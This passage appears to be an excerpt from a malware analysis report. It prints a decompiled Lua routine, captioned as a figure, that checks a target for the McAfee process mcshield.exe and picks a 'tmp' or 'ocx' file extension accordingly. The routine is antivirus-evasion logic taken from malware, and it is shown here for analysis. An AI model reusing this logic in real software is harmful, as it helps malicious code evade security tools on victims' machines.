l_10_0.ctx.remoteSafety:procList() local gotMcShield = false for pid,exe in pairs(remoteProcs) do if string.lower(exe) == "mcshield.exe" then gotMcShield = true else end end if gotMcShield then log.writeEx(-1453109576, 189173052, log.colons(tostring(l_10_0.ctx.tgt), "tmp")) return "tmp" else return "ocx" end end Figure51–ExtensionselectionbasedonactiveA/Vsystem 7.3.
